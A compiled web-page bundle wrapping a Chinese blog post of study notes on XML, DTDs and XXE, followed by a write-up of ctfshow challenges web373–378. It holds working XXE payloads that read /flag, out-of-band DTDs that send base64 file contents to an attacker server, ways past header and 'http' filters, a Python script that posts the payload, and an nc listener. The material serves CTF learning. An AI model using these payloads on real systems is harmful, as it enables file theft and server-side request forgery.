import{Bt as e,Gn as t,Gt as n,H as r,Qn as i,Rt as a,V as o,X as s,_n as c}from"./framework.DfD1zdSt.js";import{t as l}from"./theme.DMgGaAyl.js";import"./chunks/vue-i18n.BSMUyWAh.js";import{a as u,i as d}from"./chunks/vue-router.DZdD3Cav.js";var f={__name:`ctfshow-xxe`,setup(f,{expose:p}){let m=t(JSON.parse(`{"title":"ctfshow-xxe","description":"","frontmatter":{"title":"ctfshow-xxe","date":"2025-05-19 19:02:05","tags":["xxe"],"categories":["学习笔记"],"firstImage":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505191957523.png"},"headers":[],"relativePath":"pages/posts/ctfshow-xxe.md"}`)),h=u(),g=d(),_=Object.assign(g.meta.frontmatter||{},m.value?.frontmatter||{});return h.currentRoute.value.data=m.value,e(`valaxy:frontmatter`,_),globalThis.$frontmatter=_,p({frontmatter:{title:`ctfshow-xxe`,date:`2025-05-19 19:02:05`,tags:[`xxe`],categories:[`学习笔记`]}}),(e,t)=>{let u=l;return a(),r(u,{frontmatter:i(_)},{"main-content-md":c(()=>[...t[0]||=[o(`p`,null,`摘要：XML语法 1.是树形结构，必须具有根元素 例如 2.声明：&lt;?xml version=“1.0” encoding=“UTF-8”? 3.在标签中，大小写敏感 4.属性的值必须加引号 5.实体引用 一些字符拥有特殊含义，所以使用实体引用代替特殊字符 DTD 作用 在XML文档中加入DTD声明可以。`,-1),o(`p`,null,`<!-- more -->`,-1),o(`h3`,{id:`xml语法`,tabindex:`-1`},[s(`XML语法 `),o(`a`,{class:`header-anchor`,href:`#xml语法`,"aria-label":`Permalink to "XML语法"`},`​`)],-1),o(`p`,null,`1.是树形结构，必须具有根元素`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<root>
  <child>
    <subchild>.....</subchild>
  </child>
</root>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`例如`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<?xml version="1.0" encoding="UTF-8"?>
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note> 
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,"2.声明：`<?xml version=“1.0” encoding=“UTF-8”?>`",-1),o(`p`,null,`3.在标签中，大小写敏感`,-1),o(`p`,null,`4.属性的值必须加引号`,-1),o(`p`,null,`5.实体引用`,-1),o(`p`,null,`一些字符拥有特殊含义，所以使用实体引用代替特殊字符`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<message>if salary < 1000 then</message>
<!--上面的<是特殊字符 在解析器中会把他当做新元素的开始 修改如下-->
<message>if salary &lt; 1000 then</message>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h3`,{id:`dtd`,tabindex:`-1`},[s(`DTD `),o(`a`,{class:`header-anchor`,href:`#dtd`,"aria-label":`Permalink to "DTD"`},`​`)],-1),o(`p`,null,`作用`,-1),o(`p`,null,`在XML文档中加入DTD声明可以告诉XML解析器该文档遵循哪个DTD文档类型，对文档进行验证，以确保文档正确性。`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rootElement SYSTEM "example.dtd">
<rootElement>
  <childElement>Hello World!</childElement>
</rootElement>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`限制：<!ELEMENT`,-1),o(`h3`,{id:`xxe`,tabindex:`-1`},[s(`XXE `),o(`a`,{class:`header-anchor`,href:`#xxe`,"aria-label":`Permalink to "XXE"`},`​`)],-1),o(`p`,null,`什么是XXE：构造恶意DTD主要是利用实体引用`,-1),o(`p`,null,`实体引用介绍：`,-1),o(`p`,null,`一、通用实体`,-1),o(`p`,null,`1.内部实体（无SYSTEM 不需要应用外部文件）`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
        <!ELEMENT foo ANY >  <!--定义元素为any 说明接收任何元素 -->
<!ENTITY xxe "test" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`在user标签中，使用&进行引用，解析输出时就会被test替换`,-1),o(`p`,null,`2.外部实体（带有SYSTEM 需要请求外部文件）`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`相当于在dtd文档中创建了外部实体xxe，该实体的作用是读取本地文件`,-1),o(`p`,null,`当解析xml文档时会遇到&xxe，它会自动读取文件的操作`,-1),o(`p`,null,`上面的SYSTEM引用的方法还能使用公用DTD的方法操作`,-1),o(`p`,null,`<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>`,-1),o(`p`,null,`二、参数实体`,-1),o(`p`,null,`定义：%实体名`,-1),o(`p`,null,`引用：%实体名`,-1),o(`p`,null,`特点：类似上面通用实体，支持外部引用`,-1),o(`p`,null,`举例：`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
%an-element; %remote-dtd;
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`XXE危害`,-1),o(`p`,null,`1.file://xxx读取文件`,-1),o(`p`,null,`2.SSRF攻击`,-1),o(`p`,null,`3.盲注 信息数据泄露`,-1),o(`p`,null,`4.结合文件上传 getshell`,-1),o(`h3`,{id:`web373-有回显`,tabindex:`-1`},[s(`web373（有回显） `),o(`a`,{class:`header-anchor`,href:`#web373-有回显`,"aria-label":`Permalink to "web373（有回显）"`},`​`)],-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);   
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`我们来看代码，创建DOMDocument对象，加载XML文件，然后再XML文件中再提取ctfshow标签的内容，进行echo显示`,-1),o(`p`,null,`解题：首先存在一个php://input读取我们抓包的内容`,-1),o(`p`,null,`那么我们可以写一个xml文件`,-1),o(`p`,null,`然后再ctfshow标签中引用外部实体，读取flag文件`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY cmd SYSTEM "file:///flag">
]>
<happy>
<ctfshow>&cmd;</ctfshow>
</happy>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`得到flag`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505191957523.png`,alt:`image-20250519195729400`,loading:`lazy`,decoding:`async`})],-1),o(`h3`,{id:`web374-无回显`,tabindex:`-1`},[s(`web374（无回显） `),o(`a`,{class:`header-anchor`,href:`#web374-无回显`,"aria-label":`Permalink to "web374（无回显）"`},`​`)],-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);  
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`我们来观察这道题和上题的区别，同样存在xml文档的加载，但是却没有了echo进行回显，所以这道题怎么做`,-1),o(`p`,null,`我们考虑flag外带，上我们自己的服务器将内容带出`,-1),o(`p`,null,`分为两个部分：一个是直接让我们的题目服务器解析的xml文档语句，一个是我们存放在我们自己的vps上的外部dtd文档，然后在题目服务器xml解析时对我们的vps发起请求，然后在vps中将获得的内容传输到端口监听中`,-1),o(`ol`,null,[o(`li`,null,[s(`使用`),o(`code`,null,`php://filter`),s(` 获取目标文件内容，然后将内容以http请求的方式发送到我们的vps上`)])],-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<?xml version="1.0" encoding="UTF-8"?>
<!-- 格式约束-->
<!DOCTYPE updateProfile [
        <!--使用伪协议读取题目服务器中的文件-->
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"> 
        <!--写在我们服务器的dtd文件-->
    <!ENTITY % dtds SYSTEM "http://xxx/test/test.dtd">
        <!--解析dtd的时候把外部的dtd文件放过来-->
    %dtds;
]>
        
<!--补全形式-->      
<root>
1
</root>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`2.放在我们服务器上的内容`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<!ENTITY % dtd "<!ENTITY &#x25; showflag SYSTEM 'http://ip:port/%file;'>">
<!--evil.dtd的内容，内部的%号要进行实体编码成&#x25;  相当于% showflag-->
%dtd;
%showflag;
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`首先在1中会解析%dtds 去调用2的内容`,-1),o(`p`,null,`然后2的内容展示在面板上之后会触发2中%dtd的解析 将2中内层嵌套的语句加载到面板上`,-1),o(`p`,null,`然后解析%showflag 去加载SYSTEM的语句，访问我们的vps，同时携带file获得的数据，其中%file获得已经在面板中1里面的请求。`,-1),o(`p`,null,`注意！一定要注意 POST传输的数据里面一定不要和vps中的文件里面定义的变量重名。比如vps中设置的是dtd我们POST传输的时候需要dtds或者其他任意的。`,-1),o(`p`,null,`然后再bp中POST传入payload`,-1),o(`p`,null,`在自己服务器开启监听nc -lnvp port`,-1),o(`h3`,{id:`web375`,tabindex:`-1`},[s(`web375 `),o(`a`,{class:`header-anchor`,href:`#web375`,"aria-label":`Permalink to "web375"`},`​`)],-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\\?xml version="1\\.0"/', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`继续与上题进行类比，我们可以发现增加的是对xml头的整个语句的正则匹配`,-1),o(`p`,null,`这里匹配到的语句是：<?xml version=“1.0”`,-1),o(`p`,null,`绕过方法一：`,-1),o(`p`,null,`直接不写了，传一下看看`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<!-- 要引用（dtd里面），所以要加百分号% -->
<!-- /flag 改成 /etc/passwd 可能会失败，因为内容太多了 -->
<!DOCTYPE hacker[
    <!ENTITY  % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
    <!ENTITY  % dtds SYSTEM "http://xxx/test/test.dtd">

    %dtds;
]> 
<!-- 不能直接<!ENTITY  % myurl SYSTEM "http://vps-ip:port/%file"> ，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制-->
<!-- %myurl;会读取远程dtd文件，读到了以后，因为远程dtd文件有一个实体的定义（% dtd），那么就会解析这个实体定义。（% dtd）实体的定义内容是另外一个实体定义（&#x25; vps），那就会解析（&#x25; vps），就会执行远程请求，请求地址（http://vps-ip:port/%file），会在我们的vps日志上留下痕迹。
也可以起nc监听端口，能判断是否有向我们的vps发送请求以及请求内容。起nc的话% myurl的值，不要加端口，就vps-ip够了。
总结就是，%myurl 这种引用会自动向地址发送请求。 -->

<root>
1
</root>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`绕过方法二：添加空格`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<?xml version="1.0" encoding="UTF-8"?>
<!-- 上面是限制的语句-->
<?xml  version="1.0" encoding="UTF-8"?>
<!-- 我们多添加一个空格就和整个句子不同了-->
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`绕过方法三：引号替换绕过`,-1),o(`div`,{class:`language-xml`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`xml`),o(`pre`,null,[o(`code`,{class:`language-xml`},`<?xml version="1.0" encoding="UTF-8"?>
<!-- 上面是限制的语句-->
<?xml  version='1.0' encoding="UTF-8"?>
<!-- 我们双引号换成单引号就和整个句子不同了-->
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h3`,{id:`web376`,tabindex:`-1`},[s(`web376 `),o(`a`,{class:`header-anchor`,href:`#web376`,"aria-label":`Permalink to "web376"`},`​`)],-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\\?xml version="1\\.0"/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__); 
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`比较与上题的区别，正则后面添加了一个/i表示整个匹配不区分大小写`,-1),o(`p`,null,`和上一题的payload相同`,-1),o(`h3`,{id:`web377`,tabindex:`-1`},[s(`web377 `),o(`a`,{class:`header-anchor`,href:`#web377`,"aria-label":`Permalink to "web377"`},`​`)],-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\\?xml version="1\\.0"|http/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`我们来看和上题的区别，添加了对http的限制`,-1),o(`p`,null,`在xml文档的编码中，不仅支持utf-8编码，同时也支持utf-16编码，所以我们也可以将payload转为utf-8编码，然后post传送数据`,-1),o(`div`,{class:`language-py`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`py`),o(`pre`,null,[o(`code`,{class:`language-py`},`import requests

url = "http://c5cd315f-3854-4073-b5dc-42c8d51f32e4.challenge.ctf.show/"
payload = '''
<!DOCTYPE hacker[
    <!ENTITY  % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
    <!ENTITY  % dtds SYSTEM "http://154.8.183.198/test/test.dtd">

    %dtds;
]> 

<root>
1
</root>'''
payload = payload.encode('utf-8')
print(payload)
re = requests.post(url, data=payload)
print(re.text)
#b'\\xff\\xfe\\n\\x00<\\x00!\\x00D\\x00O\\x00C\\x00T\\x00Y\\x00P\\x00E\\x00 \\x00h\\x00a\\x00c\\x00k\\x00e\\x00r\\x00[\\x00\\n\\x00 \\x00 \\x00 \\x00 \\x00<\\x00!\\x00E\\x00N\\x00T\\x00I\\x00T\\x00Y\\x00 \\x00 \\x00%\\x00 \\x00f\\x00i\\x00l\\x00e\\x00 \\x00S\\x00Y\\x00S\\x00T\\x00E\\x00M\\x00 \\x00"\\x00p\\x00h\\x00p\\x00:\\x00/\\x00/\\x00f\\x00i\\x00l\\x00t\\x00e\\x00r\\x00/\\x00r\\x00e\\x00a\\x00d\\x00=\\x00c\\x00o\\x00n\\x00v\\x00e\\x00r\\x00t\\x00.\\x00b\\x00a\\x00s\\x00e\\x006\\x004\\x00-\\x00e\\x00n\\x00c\\x00o\\x00d\\x00e\\x00/\\x00r\\x00e\\x00s\\x00o\\x00u\\x00r\\x00c\\x00e\\x00=\\x00/\\x00f\\x00l\\x00a\\x00g\\x00"\\x00>\\x00\\n\\x00 \\x00 \\x00 \\x00 \\x00<\\x00!\\x00E\\x00N\\x00T\\x00I\\x00T\\x00Y\\x00 \\x00 \\x00%\\x00 \\x00d\\x00t\\x00d\\x00s\\x00 \\x00S\\x00Y\\x00S\\x00T\\x00E\\x00M\\x00 \\x00"\\x00h\\x00t\\x00t\\x00p\\x00:\\x00/\\x00/\\x001\\x005\\x004\\x00.\\x008\\x00.\\x001\\x008\\x003\\x00.\\x001\\x009\\x008\\x00/\\x00t\\x00e\\x00s\\x00t\\x00/\\x00t\\x00e\\x00s\\x00t\\x00.\\x00d\\x00t\\x00d\\x00"\\x00>\\x00\\n\\x00\\n\\x00 \\x00 \\x00 \\x00 \\x00%\\x00d\\x00t\\x00d\\x00s\\x00;\\x00\\n\\x00]\\x00>\\x00 \\x00\\n\\x00\\n\\x00<\\x00r\\x00o\\x00o\\x00t\\x00>\\x00\\n\\x001\\x00\\n\\x00<\\x00/\\x00r\\x00o\\x00o\\x00t\\x00>\\x00'
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`我们发现编码后http彻底绕过`,-1),o(`p`,null,`然后nc连接，成功获得flag`,-1),o(`h3`,{id:`web378`,tabindex:`-1`},[s(`web378 `),o(`a`,{class:`header-anchor`,href:`#web378`,"aria-label":`Permalink to "web378"`},`​`)],-1),o(`p`,null,`打开后是一个登录界面，ctrl+u查看一下源码`,-1),o(`p`,null,`看到post里存在xxe`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505192111760.png`,alt:`image-20250519211113702`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`访问/doLogin，post传参`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY cmd SYSTEM "file:///flag">
]>
<user><username>&cmd;</username><password>&cmd;</password></user>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505192110602.png`,alt:`image-20250519211058311`,loading:`lazy`,decoding:`async`})],-1)]]),"main-header":c(()=>[n(e.$slots,`main-header`)]),"main-header-after":c(()=>[n(e.$slots,`main-header-after`)]),"main-nav":c(()=>[n(e.$slots,`main-nav`)]),"main-content-before":c(()=>[n(e.$slots,`main-content-before`)]),"main-content":c(()=>[n(e.$slots,`main-content`)]),"main-content-after":c(()=>[n(e.$slots,`main-content-after`)]),"main-nav-before":c(()=>[n(e.$slots,`main-nav-before`)]),"main-nav-after":c(()=>[n(e.$slots,`main-nav-after`)]),comment:c(()=>[n(e.$slots,`comment`)]),footer:c(()=>[n(e.$slots,`footer`)]),aside:c(()=>[n(e.$slots,`aside`)]),"aside-custom":c(()=>[n(e.$slots,`aside-custom`)]),default:c(()=>[n(e.$slots,`default`)]),_:3},8,[`frontmatter`])}}};export{f as default};